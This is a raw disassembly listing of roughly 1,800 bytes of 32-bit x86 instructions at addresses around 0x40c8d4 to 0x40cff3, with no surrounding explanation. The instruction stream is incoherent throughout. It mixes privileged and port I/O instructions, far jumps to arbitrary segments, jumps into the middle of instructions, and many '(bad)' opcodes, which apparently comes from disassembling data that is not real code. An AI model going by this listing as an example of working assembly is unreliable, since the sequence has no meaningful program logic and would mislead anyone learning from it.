  40c8d4:	push   ds
  40c8d5:	and    al,0xbd
  40c8d7:	sti    
  40c8d8:	jmp    0xf241:0x91c55e13
  40c8df:	sti    
  40c8e0:	sbb    BYTE PTR [esi+0x25],0xa7
  40c8e4:	fprem1 
  40c8e6:	adc    al,0xe6
  40c8e8:	dec    eax
  40c8e9:	cmp    al,0x44
  40c8eb:	pop    edx
  40c8ec:	sbb    ah,ah
  40c8ee:	frstor [esi-0xea22e36]
  40c8f4:	je     0x40c8e4
  40c8f6:	add    edx,eax
  40c8f8:	mov    eax,0x8bc65fd7
  40c8fd:	mov    esp,0x8c526ee3
  40c902:	mov    DWORD PTR [ebx],ecx
  40c904:	push   edi
  40c905:	xor    al,0x1d
  40c907:	int3   
  40c908:	shl    DWORD PTR [ebx],1
  40c90a:	mov    esi,0xd6299bd9
  40c90f:	iret   
  40c910:	mov    edi,0x5d50ceab
  40c915:	add    DWORD PTR [eax],eax
  40c917:	std    
  40c918:	cdq    
  40c919:	sub    DWORD PTR [ebx-0x20],esi
  40c91c:	pop    ecx
  40c91d:	ss scas al,BYTE PTR es:[edi]
  40c91f:	mov    ebx,0x3a4879dd
  40c924:	and    ch,BYTE PTR [edx+ebx*4]
  40c927:	or     DWORD PTR [ebx-0x71a3973c],edx
  40c92d:	mov    cl,BYTE PTR [ebp+eax*2-0x2a]
  40c931:	jl     0x40c961
  40c933:	xchg   edx,eax
  40c934:	dec    ecx
  40c935:	inc    ebx
  40c936:	mov    ds:0x216fddba,eax
  40c93b:	fimul  DWORD PTR [edx]
  40c93d:	and    al,0xbd
  40c93f:	xor    BYTE PTR [esi+0x40dd6b49],0xd1
  40c946:	icebp  
  40c947:	mov    edi,0x42516fd6
  40c94c:	std    
  40c94d:	sub    al,0xd7
  40c94f:	jmp    0x40c912
  40c951:	imul   ecx,DWORD PTR [ebx],0xffffff88
  40c954:	ins    DWORD PTR es:[edi],dx
  40c955:	inc    eax
  40c956:	sub    esp,ecx
  40c958:	ret    
  40c959:	stc    
  40c95a:	int    0xc2
  40c95c:	imul   DWORD PTR [edx+ebp*8-0x6f4cccea]
  40c963:	inc    ecx
  40c964:	push   ebx
  40c965:	adc    eax,0x8ac2c9ee
  40c96a:	dec    ebp
  40c96b:	inc    ebp
  40c96c:	mov    cl,BYTE PTR [esi-0x6d]
  40c96f:	lahf   
  40c970:	int    0xc7
  40c972:	lods   eax,DWORD PTR ds:[esi]
  40c973:	xor    BYTE PTR [ebp-0x28cfaa41],dh
  40c979:	sbb    eax,0x44dc3dff
  40c97e:	push   esp
  40c97f:	jp     0x40c9ed
  40c981:	cmc    
  40c982:	sub    bh,dh
  40c984:	fstp   QWORD PTR [ebx-0x7a697d6c]
  40c98a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c98b:	retf   0xcb2
  40c98e:	push   esp
  40c98f:	and    al,BYTE PTR [edi+eiz*8-0x79df8e6f]
  40c996:	lods   eax,DWORD PTR ds:[esi]
  40c997:	es mov bh,0x8e
  40c99a:	pop    ebx
  40c99b:	in     al,0x3b
  40c99d:	fsub   DWORD PTR [edx-0x16]
  40c9a0:	mov    dl,0x5d
  40c9a2:	mov    dl,0xa8
  40c9a4:	test   al,0x92
  40c9a6:	cs mov esp,0x89eb2466
  40c9ac:	lock add eax,DWORD PTR [ebx]
  40c9af:	adc    DWORD PTR [eax-0x3b98f9a1],esi
  40c9b5:	jmp    0x40ca10
  40c9b7:	jne    0x40c94a
  40c9b9:	loopne 0x40c96c
  40c9bb:	jl     0x40ca01
  40c9bd:	aam    0x65
  40c9bf:	loop   0x40c94f
  40c9c1:	jmp    0x85e01bab
  40c9c6:	xchg   esi,eax
  40c9c7:	inc    ebp
  40c9c8:	call   0xd256f01c
  40c9cd:	out    0x7f,eax
  40c9cf:	and    ebx,DWORD PTR [edx]
  40c9d1:	cmp    al,0x93
  40c9d3:	loop   0x40c9bf
  40c9d5:	push   ds
  40c9d6:	add    ebx,ebx
  40c9d8:	mov    eax,ds:0xf57e12c
  40c9dd:	aaa    
  40c9de:	hlt    
  40c9df:	add    eax,0x100c39a5
  40c9e4:	jl     0x40ca1e
  40c9e6:	scas   eax,DWORD PTR es:[edi]
  40c9e7:	jb     0x40ca05
  40c9e9:	xor    al,0x48
  40c9eb:	and    al,dl
  40c9ed:	or     DWORD PTR [edx-0x1a],ebp
  40c9f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9f2:	into   
  40c9f3:	dec    esi
  40c9f4:	pop    ebx
  40c9f5:	out    0xa2,eax
  40c9f7:	push   esp
  40c9f8:	mov    dh,0xa5
  40c9fa:	js     0x40c9d2
  40c9fc:	cwde   
  40c9fd:	and    al,0x71
  40c9ff:	cmc    
  40ca00:	dec    esp
  40ca01:	or     eax,DWORD PTR [edi-0x4594c22e]
  40ca07:	je     0x40ca68
  40ca09:	inc    edi
  40ca0a:	ret    
  40ca0b:	jmp    0x40c9de
  40ca0d:	out    0x85,eax
  40ca0f:	jnp    0x40ca43
  40ca11:	repnz dec edi
  40ca13:	std    
  40ca14:	jmp    0x40ca91
  40ca16:	test   BYTE PTR [esi],ah
  40ca18:	test   BYTE PTR [edi-0x11713082],ch
  40ca1e:	pop    ss
  40ca1f:	in     al,dx
  40ca20:	(bad)  
  40ca21:	mov    ebp,0xfb150abb
  40ca26:	mov    eax,ds:0x48af425b
  40ca2b:	fild   WORD PTR [eax+0x21]
  40ca2e:	mov    esi,0x70c79d01
  40ca33:	sbb    bh,BYTE PTR [ebp-0x5b87322a]
  40ca39:	call   0x208b:0xd809796c
  40ca40:	jg     0x40c9cf
  40ca42:	sahf   
  40ca43:	repnz scas eax,DWORD PTR es:[edi]
  40ca45:	es pop ebp
  40ca47:	fistp  QWORD PTR [ecx]
  40ca49:	ins    BYTE PTR es:[edi],dx
  40ca4a:	hlt    
  40ca4b:	jns    0x40cab2
  40ca4d:	sub    ebx,DWORD PTR [eax+esi*8-0x134dc204]
  40ca54:	mov    cl,BYTE PTR ds:0xcec99d20
  40ca5a:	ficomp DWORD PTR [ecx-0x730fda39]
  40ca60:	sbb    DWORD PTR [eax+0x65],esi
  40ca63:	jne    0x40ca90
  40ca65:	and    eax,0xed13bab9
  40ca6a:	push   ecx
  40ca6b:	data16 mov al,ds:0x83a3d126
  40ca71:	retf   0x4b33
  40ca74:	(bad)  
  40ca75:	jg     0x40ca1c
  40ca77:	pop    esp
  40ca78:	sbb    al,0x9b
  40ca7a:	mov    ah,0x5
  40ca7c:	dec    edi
  40ca7d:	imul   ebp,DWORD PTR [edi],0x8fae34e
  40ca83:	cmp    esi,DWORD PTR [edi+0x6db7d828]
  40ca89:	mov    ah,0xbf
  40ca8b:	sbb    eax,DWORD PTR [ebx+eax*2]
  40ca8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca8f:	popa   
  40ca90:	inc    esp
  40ca91:	push   0x2d
  40ca93:	add    ch,BYTE PTR [edi+0x24e0daf]
  40ca99:	mov    ah,0xbd
  40ca9b:	lahf   
  40ca9c:	es push 0xffffffd9
  40ca9f:	pop    es
  40caa0:	mov    al,0x6e
  40caa2:	xchg   cx,ax
  40caa4:	jl     0x40ca26
  40caa6:	scas   al,BYTE PTR es:[edi]
  40caa7:	sub    al,0xdd
  40caa9:	cmp    esi,DWORD PTR [ecx-0x67b65ef0]
  40caaf:	test   BYTE PTR [edi],0x1
  40cab2:	out    dx,eax
  40cab3:	cmp    DWORD PTR [ebx+0x6d334b85],esi
  40cab9:	les    eax,FWORD PTR [ecx+esi*2]
  40cabc:	pop    ebx
  40cabd:	xor    ch,BYTE PTR [ecx+eiz*2]
  40cac0:	xchg   ebx,eax
  40cac1:	lahf   
  40cac2:	ret    0xbbc6
  40cac5:	bound  esp,QWORD PTR ds:0x52b04d63
  40cacb:	movnti DWORD PTR [eax],edi
  40cace:	xchg   DWORD PTR [ebx+0x58bfb7e2],esi
  40cad4:	je     0x40ca6f
  40cad6:	adc    BYTE PTR [ebx],0x14
  40cad9:	shl    DWORD PTR [edx],0x8d
  40cadc:	mov    BYTE PTR [eax],ch
  40cade:	in     al,0xdb
  40cae0:	dec    ebx
  40cae1:	jmp    0x40cb22
  40cae3:	dec    ecx
  40cae4:	mov    al,ds:0x88334a21
  40cae9:	arpl   di,bp
  40caeb:	xchg   edi,eax
  40caec:	mov    cl,0xeb
  40caee:	sbb    dl,dl
  40caf0:	in     eax,dx
  40caf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caf2:	inc    ebp
  40caf3:	add    al,0xe7
  40caf5:	jge    0x40cab8
  40caf7:	outs   dx,BYTE PTR ds:[esi]
  40caf8:	push   ds
  40caf9:	sub    esi,DWORD PTR [ebp-0x7b27998c]
  40caff:	mov    ?,eax
  40cb01:	aam    0xdd
  40cb03:	dec    ebx
  40cb04:	icebp  
  40cb05:	xchg   ecx,eax
  40cb06:	cmp    dl,BYTE PTR [ecx]
  40cb08:	in     eax,0x32
  40cb0a:	jp     0x40ca8c
  40cb0c:	or     eax,0xfba3dd7d
  40cb11:	jmp    0x40cacf
  40cb13:	stos   DWORD PTR es:[edi],eax
  40cb14:	push   edi
  40cb15:	repnz xchg esi,eax
  40cb17:	cmp    eax,0x1dfb0081
  40cb1c:	sbb    edi,DWORD PTR es:[esi]
  40cb1f:	inc    esp
  40cb20:	cmp    al,0xc6
  40cb22:	pop    esi
  40cb23:	pop    edx
  40cb24:	pushf  
  40cb25:	mov    cl,0x17
  40cb27:	ins    DWORD PTR es:[edi],dx
  40cb28:	pop    es
  40cb29:	sub    BYTE PTR [esi],ch
  40cb2b:	cld    
  40cb2c:	push   ecx
  40cb2d:	out    0x63,al
  40cb2f:	(bad)  [ecx-0x2a]
  40cb32:	mov    dh,0x6f
  40cb34:	dec    edi
  40cb35:	push   ss
  40cb36:	mov    eax,ds:0x9d844fa8
  40cb3b:	fidivr DWORD PTR [edi-0x12]
  40cb3e:	cmp    BYTE PTR [ebx-0x2b],al
  40cb41:	mov    ebp,0x7e249f92
  40cb46:	imul   ecx,DWORD PTR [edx],0x4e
  40cb49:	add    eax,0xe4709bef
  40cb4e:	mov    eax,0x8dd3d53a
  40cb53:	push   edx
  40cb54:	fimul  WORD PTR [ecx]
  40cb56:	rol    BYTE PTR [eax+0x27],1
  40cb59:	inc    ebx
  40cb5a:	mov    cl,0xd6
  40cb5c:	xor    cl,BYTE PTR [ecx]
  40cb5e:	imul   edx,DWORD PTR [esi-0x6f0d5b0b],0x85454be3
  40cb68:	push   ss
  40cb69:	outs   dx,DWORD PTR ds:[esi]
  40cb6a:	out    0x6d,eax
  40cb6c:	mov    dl,0x4
  40cb6e:	inc    edi
  40cb6f:	dec    ecx
  40cb70:	mov    WORD PTR [ebx+0x324e9431],cs
  40cb76:	std    
  40cb77:	add    al,0xee
  40cb79:	xor    eax,0x2d209c5c
  40cb7e:	add    DWORD PTR [ebx-0x608dba03],0xffffffc0
  40cb85:	sub    BYTE PTR [ebx-0x1a],dl
  40cb88:	xor    al,0x3f
  40cb8a:	ds cld 
  40cb8c:	jbe    0x40cb22
  40cb8e:	in     al,dx
  40cb8f:	(bad)  
  40cb90:	mov    esi,0xe37866e
  40cb95:	lahf   
  40cb96:	and    eax,0x493ec89e
  40cb9b:	sti    
  40cb9c:	push   es
  40cb9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb9e:	iret   
  40cb9f:	int    0x52
  40cba1:	jne    0x40cbe5
  40cba3:	call   0xd2301cd
  40cba8:	sti    
  40cba9:	adc    DWORD PTR [eax-0x45e5407d],esi
  40cbaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb0:	enter  0x292d,0x2
  40cbb4:	mov    al,ds:0x28cefb65
  40cbb9:	mov    esp,0x114b671b
  40cbbe:	lea    ebx,[edi]
  40cbc0:	mov    bh,0x8c
  40cbc2:	jns    0x40cb7d
  40cbc4:	xor    eax,0xcbc5bf2f
  40cbc9:	xlat   BYTE PTR ds:[ebx]
  40cbca:	adc    DWORD PTR [ebx+0x2c9db417],ecx
  40cbd0:	repnz sbb al,0x65
  40cbd3:	(bad)  
  40cbd4:	jbe    0x40cb6e
  40cbd6:	push   ebx
  40cbd7:	aad    0x56
  40cbd9:	test   DWORD PTR [ecx-0x27],eax
  40cbdc:	inc    ecx
  40cbdd:	adc    ecx,ebp
  40cbdf:	push   ebp
  40cbe0:	sub    al,0xa3
  40cbe2:	scas   eax,DWORD PTR es:[edi]
  40cbe3:	add    al,0x39
  40cbe5:	sbb    eax,0x65c5967a
  40cbea:	fwait
  40cbeb:	push   edx
  40cbec:	push   cs
  40cbed:	repnz dec esp
  40cbef:	push   edx
  40cbf0:	in     eax,0x3a
  40cbf2:	in     eax,dx
  40cbf3:	in     al,0x39
  40cbf5:	in     eax,dx
  40cbf6:	cmp    DWORD PTR [edx+0x4363043c],esp
  40cbfc:	xchg   ebx,eax
  40cbfd:	pop    edi
  40cbfe:	xchg   edx,eax
  40cbff:	ins    BYTE PTR es:[edi],dx
  40cc00:	xchg   ebx,eax
  40cc01:	dec    ebx
  40cc02:	cmp    esp,ebp
  40cc04:	mov    dl,0x14
  40cc06:	inc    eax
  40cc07:	test   eax,eax
  40cc09:	icebp  
  40cc0a:	jg     0x40cb95
  40cc0c:	push   ecx
  40cc0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc0e:	nop
  40cc0f:	dec    edx
  40cc10:	or     esi,esp
  40cc12:	and    dl,BYTE PTR [edx]
  40cc14:	icebp  
  40cc15:	test   al,dh
  40cc17:	cmp    eax,0xe7a3e2a3
  40cc1c:	mov    esp,0x342e0f23
  40cc21:	mov    ebp,0x6ef2c832
  40cc26:	push   cs
  40cc27:	ret    0x598c
  40cc2a:	loope  0x40cc4f
  40cc2c:	in     eax,dx
  40cc2d:	xchg   esi,eax
  40cc2e:	xchg   esp,eax
  40cc2f:	pushf  
  40cc30:	ja     0x40cc6d
  40cc32:	jmp    0xe58e:0x5a9eafc8
  40cc39:	js     0x40cbf8
  40cc3b:	aas    
  40cc3c:	std    
  40cc3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc3e:	inc    ebp
  40cc3f:	dec    edi
  40cc40:	cmp    ebp,ebp
  40cc42:	dec    edx
  40cc43:	mov    edx,0x1f400dea
  40cc48:	stc    
  40cc49:	fstp   TBYTE PTR [edx+0x2a8fc57b]
  40cc4f:	fcomp  st(6)
  40cc51:	dec    edi
  40cc52:	sub    al,0x2c
  40cc54:	jg     0x40cc3f
  40cc56:	gs add eax,0xe8304d2c
  40cc5c:	mov    ah,bh
  40cc5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc5f:	add    eax,0x268513bf
  40cc64:	ins    DWORD PTR es:[edi],dx
  40cc65:	dec    edi
  40cc66:	or     al,0x87
  40cc68:	hlt    
  40cc69:	push   es
  40cc6a:	push   0x6db42121
  40cc6f:	xchg   ebx,eax
  40cc70:	jnp    0x40cc11
  40cc72:	sti    
  40cc73:	cmp    DWORD PTR [esi],eax
  40cc75:	adc    esi,DWORD PTR [eax]
  40cc77:	neg    bh
  40cc79:	aam    0x6
  40cc7b:	add    al,0xf7
  40cc7d:	mov    bh,0xd7
  40cc7f:	(bad)  
  40cc80:	cdq    
  40cc81:	add    bh,BYTE PTR [edx+eiz*2]
  40cc84:	mov    edx,0xcbd865ad
  40cc89:	inc    eax
  40cc8a:	add    DWORD PTR [esi-0x7d],0xd9ac1b1b
  40cc91:	push   esi
  40cc92:	ja     0x40ccd9
  40cc94:	arpl   ax,sp
  40cc96:	mov    ds:0x32357474,al
  40cc9b:	mov    ch,0x38
  40cc9d:	pop    ebx
  40cc9e:	aaa    
  40cc9f:	add    al,0xa9
  40cca1:	and    al,0x13
  40cca3:	jmp    0x40cc3c
  40cca5:	scas   eax,DWORD PTR es:[edi]
  40cca6:	pop    esp
  40cca7:	lods   al,BYTE PTR ds:[esi]
  40cca8:	xchg   esi,eax
  40cca9:	push   esp
  40ccaa:	lods   eax,DWORD PTR ds:[esi]
  40ccab:	sub    al,0x9c
  40ccad:	les    edi,FWORD PTR [ebx+0x5ddd270c]
  40ccb3:	pusha  
  40ccb4:	jl     0x40cc9f
  40ccb6:	in     eax,dx
  40ccb7:	es xor cl,dh
  40ccba:	popa   
  40ccbb:	jb     0x40cce6
  40ccbd:	push   0xffffffc8
  40ccbf:	dec    edi
  40ccc0:	rcl    edi,1
  40ccc2:	jns    0x40cce6
  40ccc4:	loope  0x40ccf2
  40ccc6:	inc    ecx
  40ccc7:	jae    0x40cc6e
  40ccc9:	lock outs dx,BYTE PTR ds:[esi]
  40cccb:	(bad)  
  40cccc:	popa   
  40cccd:	and    eax,0xbb15732c
  40ccd2:	pop    es
  40ccd3:	popa   
  40ccd4:	rol    BYTE PTR [ecx],cl
  40ccd6:	jne    0x40cc7c
  40ccd8:	jmp    FWORD PTR [ecx]
  40ccda:	popa   
  40ccdb:	adc    ah,BYTE PTR [edx]
  40ccdd:	add    bl,cl
  40ccdf:	jge    0x40ccf8
  40cce1:	xor    al,0x2b
  40cce3:	popa   
  40cce4:	jmp    0x257be707
  40cce9:	adc    bh,BYTE PTR [ebx]
  40cceb:	jp     0x40cd18
  40cced:	mov    WORD PTR [ebp-0x240ecc09],ss
  40ccf3:	arpl   sp,bp
  40ccf5:	push   0xffffffdc
  40ccf7:	xlat   BYTE PTR ds:[ebx]
  40ccf8:	xchg   ebx,eax
  40ccf9:	mov    ds,edx
  40ccfb:	mov    eax,0x72bfa483
  40cd00:	out    0xf5,al
  40cd02:	xor    eax,esp
  40cd04:	xchg   ebp,eax
  40cd05:	dec    sp
  40cd07:	jecxz  0x40ccd1
  40cd09:	in     eax,0x7e
  40cd0b:	push   ebx
  40cd0c:	out    dx,al
  40cd0d:	ror    BYTE PTR [edi-0x2cde0165],cl
  40cd13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd14:	ja     0x40ccd6
  40cd16:	les    edi,FWORD PTR [eax+0x47]
  40cd19:	sahf   
  40cd1a:	mov    bl,0xb7
  40cd1c:	jg     0x40cd3a
  40cd1e:	mov    esi,0xadbb5916
  40cd23:	xchg   edi,eax
  40cd24:	addr16 mov dh,0x8d
  40cd27:	dec    esp
  40cd28:	data16 fcomp QWORD PTR [ebp+0x482cff1d]
  40cd2f:	fst    st(2)
  40cd31:	or     al,0xd9
  40cd33:	fisttp QWORD PTR [ebp+0x31]
  40cd36:	ror    DWORD PTR [edx-0x3e9b695d],1
  40cd3c:	sahf   
  40cd3d:	popf   
  40cd3e:	push   DWORD PTR [ebp-0x54]
  40cd41:	hlt    
  40cd42:	pop    ebx
  40cd43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd44:	add    eax,0x4b16fc39
  40cd49:	das    
  40cd4a:	neg    ecx
  40cd4c:	xchg   esp,eax
  40cd4d:	mov    ebx,0x68724441
  40cd52:	xchg   DWORD PTR [ebx-0x4dcb75e8],eax
  40cd58:	imul   ebp,DWORD PTR [ebx+0xa3b6bdd],0xcb21c8b
  40cd62:	jae    0x40cdb6
  40cd64:	mov    fs,ebx
  40cd66:	push   es
  40cd67:	push   ss
  40cd68:	and    DWORD PTR [edx],ebx
  40cd6a:	call   0x4bdb:0xb45d8b31
  40cd71:	cmp    bl,BYTE PTR [edi]
  40cd73:	aad    0xf9
  40cd75:	mov    dl,0x85
  40cd77:	aaa    
  40cd78:	mov    dh,0xa3
  40cd7a:	(bad)  
  40cd7b:	in     al,dx
  40cd7c:	cwde   
  40cd7d:	bound  eax,QWORD PTR [edx]
  40cd7f:	sbb    eax,eax
  40cd81:	xchg   edi,eax
  40cd82:	push   0x6d
  40cd84:	jo     0x40cdf1
  40cd86:	push   ds
  40cd87:	addr16 std 
  40cd89:	push   0xffffff90
  40cd8b:	dec    esp
  40cd8c:	or     eax,0x31d0b894
  40cd91:	outs   dx,BYTE PTR ds:[esi]
  40cd92:	mov    dl,0xb7
  40cd94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd95:	xor    DWORD PTR [ebx],esp
  40cd97:	cdq    
  40cd98:	add    BYTE PTR [edx+ebp*1+0x67abb70c],al
  40cd9f:	adc    DWORD PTR [edi+0x1c],esi
  40cda2:	dec    edi
  40cda3:	mov    ds:0xaab8cd6b,al
  40cda8:	pop    ss
  40cda9:	cmp    cl,BYTE PTR [esi]
  40cdab:	xchg   esi,eax
  40cdac:	fld    QWORD PTR [edi+ebx*4-0x6f178c4d]
  40cdb3:	imul   edi,DWORD PTR [edx+0x1a731169],0xf741f69e
  40cdbd:	add    al,0x3e
  40cdbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdc0:	mov    edi,0x4e266aaa
  40cdc5:	sub    dh,BYTE PTR [eax-0x2]
  40cdc8:	xchg   esp,eax
  40cdc9:	fs out dx,eax
  40cdcb:	arpl   WORD PTR ds:0xf5ba2825,cx
  40cdd1:	(bad)  
  40cdd2:	arpl   WORD PTR [eax+0x784470d4],bp
  40cdd8:	xor    al,0xdd
  40cdda:	jmp    0x17a8d99f
  40cddf:	sub    BYTE PTR [edi-0x7eb2436d],dl
  40cde5:	mov    cl,0x25
  40cde7:	outs   dx,DWORD PTR ds:[esi]
  40cde8:	hlt    
  40cde9:	scas   al,BYTE PTR es:[edi]
  40cdea:	pop    ebp
  40cdeb:	ror    BYTE PTR [edx+0x711837c7],cl
  40cdf1:	add    cl,BYTE PTR [ebx]
  40cdf3:	adc    DWORD PTR [edi*4-0x2f510f0],0x1
  40cdfb:	add    al,0x74
  40cdfd:	ss mov ch,0x1c
  40ce00:	pop    edx
  40ce01:	test   eax,0x475f8283
  40ce06:	out    dx,eax
  40ce07:	jae    0x40ce64
  40ce09:	dec    edi
  40ce0a:	push   edi
  40ce0b:	aaa    
  40ce0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce0d:	push   ds
  40ce0e:	jne    0x40ce5b
  40ce10:	loopne 0x40cd99
  40ce12:	push   ss
  40ce13:	outs   dx,BYTE PTR ds:[esi]
  40ce14:	loop   0x40ce83
  40ce16:	xchg   BYTE PTR [edi+0x6a],al
  40ce19:	jg     0x40cdcc
  40ce1b:	retf   0xab71
  40ce1e:	in     al,0xf9
  40ce20:	mov    edx,0x311879c
  40ce25:	push   ss
  40ce26:	pop    edx
  40ce27:	pushf  
  40ce28:	loope  0x40cea6
  40ce2a:	and    ecx,DWORD PTR ds:0x910847aa
  40ce30:	jb     0x40ce41
  40ce32:	xchg   ebp,eax
  40ce33:	push   ebx
  40ce34:	inc    ebx
  40ce35:	adc    eax,eax
  40ce37:	aaa    
  40ce38:	cmp    BYTE PTR [ecx],dh
  40ce3a:	mov    cl,0x28
  40ce3c:	outs   dx,DWORD PTR ds:[esi]
  40ce3d:	fdiv   DWORD PTR [edx+0x2f10781e]
  40ce43:	aas    
  40ce44:	leave  
  40ce45:	gs mov dl,0x7c
  40ce48:	sti    
  40ce49:	retf   
  40ce4a:	or     edx,DWORD PTR [eax+0x50f0624a]
  40ce50:	retw   
  40ce52:	lods   al,BYTE PTR ds:[esi]
  40ce53:	inc    esi
  40ce54:	sub    DWORD PTR [ebp+0xa],esi
  40ce57:	jne    0x40cec5
  40ce59:	inc    ecx
  40ce5a:	mov    eax,ds:0x6ecb6d59
  40ce5f:	fbstp  TBYTE PTR [esi+0x5064b37b]
  40ce65:	push   cs
  40ce66:	push   ebp
  40ce67:	out    dx,eax
  40ce68:	dec    ebx
  40ce69:	inc    ecx
  40ce6a:	cli    
  40ce6b:	ds pop es
  40ce6d:	push   cs
  40ce6e:	add    ebp,DWORD PTR [ebp*4-0x750cd286]
  40ce75:	test   BYTE PTR [ecx],cl
  40ce77:	loope  0x40ce20
  40ce79:	cmc    
  40ce7a:	push   cs
  40ce7b:	push   0x40d0046
  40ce80:	retf   
  40ce81:	(bad)  
  40ce83:	sub    al,bh
  40ce85:	jb     0x40ceab
  40ce87:	std    
  40ce88:	mov    dh,0xc
  40ce8a:	cmp    esi,DWORD PTR [eax+edx*8+0x3070602f]
  40ce91:	iret   
  40ce92:	scas   eax,DWORD PTR es:[edi]
  40ce93:	or     DWORD PTR [edi],esi
  40ce95:	es mov ebp,0xc67a796a
  40ce9b:	mov    ebx,DWORD PTR [eax]
  40ce9d:	outs   dx,DWORD PTR ds:[esi]
  40ce9e:	fsub   QWORD PTR [ebx-0x21]
  40cea1:	fwait
  40cea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cea3:	push   ss
  40cea4:	jecxz  0x40ce98
  40cea6:	popf   
  40cea7:	(bad)  
  40cea8:	sub    al,0xa3
  40ceaa:	aas    
  40ceab:	call   0x9cfc:0x131c839f
  40ceb2:	xchg   ebx,eax
  40ceb3:	fstp   st(4)
  40ceb5:	add    eax,0xdf0f37a6
  40ceba:	ss (bad) 
  40cebc:	jmp    0x40cf18
  40cebe:	jo     0x40ce61
  40cec0:	jmp    0xccb016fe
  40cec5:	jl     0x40cef2
  40cec7:	xchg   DWORD PTR [edi-0x30dd3924],ebx
  40cecd:	push   0xffffffa3
  40cecf:	(bad)  
  40ced0:	clc    
  40ced1:	hlt    
  40ced2:	mov    esi,0x8948c19f
  40ced7:	clc    
  40ced8:	dec    esi
  40ced9:	cmc    
  40ceda:	jns    0x40cef4
  40cedc:	repz adc ax,0xead4
  40cee1:	mov    edi,0x9493f377
  40cee6:	daa    
  40cee7:	xor    DWORD PTR [edi],ecx
  40cee9:	xchg   BYTE PTR [eax-0x54],al
  40ceec:	sub    eax,0x2cc498e8
  40cef1:	sub    al,0x23
  40cef3:	loopne 0x40cf66
  40cef5:	pop    ds
  40cef6:	xor    eax,0x34579b34
  40cefb:	sbb    ah,BYTE PTR [edi+0x297e9bbe]
  40cf01:	and    eax,0x27e43886
  40cf06:	mov    bl,0x9e
  40cf08:	jo     0x40cf45
  40cf0a:	ret    0x353e
  40cf0d:	aam    0x88
  40cf0f:	jns    0x40ceb8
  40cf11:	mov    BYTE PTR [ebp-0x2a],bl
  40cf14:	and    bh,BYTE PTR ds:0xaed2db8c
  40cf1a:	cmp    al,0x34
  40cf1c:	jmp    0xd633894e
  40cf21:	and    DWORD PTR [ecx-0x38],esp
  40cf24:	push   ss
  40cf25:	(bad)  
  40cf26:	sar    BYTE PTR [edx],1
  40cf28:	(bad)  
  40cf29:	nop
  40cf2a:	jecxz  0x40cf51
  40cf2c:	jo     0x40cf55
  40cf2e:	scas   eax,DWORD PTR es:[edi]
  40cf2f:	(bad)  
  40cf30:	lods   al,BYTE PTR ds:[esi]
  40cf31:	je     0x40cf33
  40cf33:	or     DWORD PTR [ecx-0x37],edi
  40cf36:	mov    ds:0xc09ea757,al
  40cf3b:	jmp    FWORD PTR [edx-0x533f5cac]
  40cf41:	jnp    0x40cf59
  40cf43:	ja     0x40cf91
  40cf45:	aaa    
  40cf46:	loop   0x40cf1a
  40cf48:	ds xor eax,0x7ba93c4c
  40cf4e:	leave  
  40cf4f:	push   ecx
  40cf50:	jle    0x40cf47
  40cf52:	mov    al,ds:0xa720fba1
  40cf57:	xchg   ebp,eax
  40cf59:	push   esp
  40cf5a:	mov    ds:0x7bde400b,eax
  40cf5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf60:	iret   
  40cf61:	bound  esp,QWORD PTR [eax]
  40cf63:	mov    al,ds:0x7c0d54d
  40cf68:	into   
  40cf69:	ins    DWORD PTR es:[edi],dx
  40cf6a:	sub    ebp,DWORD PTR [ebp+0x7ce08e3f]
  40cf70:	je     0x40cf5c
  40cf72:	fsub   DWORD PTR [eax+ebp*8+0x4a0657e9]
  40cf79:	sbb    ch,BYTE PTR [eax+0x724e4cd8]
  40cf7f:	shl    bl,cl
  40cf81:	xchg   BYTE PTR [eax-0x72247ab8],ch
  40cf87:	stc    
  40cf88:	enter  0x6cd3,0x16
  40cf8c:	dec    ecx
  40cf8d:	clc    
  40cf8e:	mov    al,0xb9
  40cf90:	jg     0x40cfa7
  40cf92:	mov    cl,0x86
  40cf94:	outs   dx,DWORD PTR ds:[esi]
  40cf95:	rcl    DWORD PTR [edi+0x5f373486],cl
  40cf9b:	mov    ah,0xe5
  40cf9d:	mov    cl,0xa4
  40cf9f:	mov    edi,0x3190aaab
  40cfa4:	stc    
  40cfa5:	push   es
  40cfa6:	or     ah,BYTE PTR [edi-0xe935c23]
  40cfac:	ss jae 0x40cfe3
  40cfaf:	pop    ss
  40cfb0:	inc    edi
  40cfb1:	cs into 
  40cfb3:	push   0x2f6583a1
  40cfb8:	loop   0x40cf58
  40cfba:	sub    al,0x53
  40cfbc:	jl     0x40d015
  40cfbe:	outs   dx,DWORD PTR ds:[esi]
  40cfbf:	mov    ebx,0x7458417f
  40cfc4:	jo     0x40d017
  40cfc6:	push   ds
  40cfc7:	imul   esp,edi,0x6c
  40cfca:	mul    edx
  40cfcc:	in     al,dx
  40cfcd:	scas   al,BYTE PTR es:[edi]
  40cfce:	xchg   edx,eax
  40cfcf:	jnp    0x40cf7d
  40cfd1:	fucomp st(5)
  40cfd3:	or     edi,DWORD PTR [eax]
  40cfd5:	jno    0x40cff3
  40cfd7:	cwde   
  40cfd8:	repnz mov bl,0x2a
  40cfdb:	aaa    
  40cfdc:	nop
  40cfdd:	icebp  
  40cfde:	jb     0x40cf62
  40cfe0:	out    dx,al
  40cfe1:	adc    al,0x72
  40cfe3:	jo     0x40cf7e
  40cfe5:	dec    ebp
  40cfe6:	mov    cs:0xbb28608a,al
  40cfec:	mov    al,0xe2
  40cfee:	xchg   esp,eax
  40cff0:	mov    bl,0x96
  40cff2:	cdq    
  40cff3:	xchg   ebx,eax
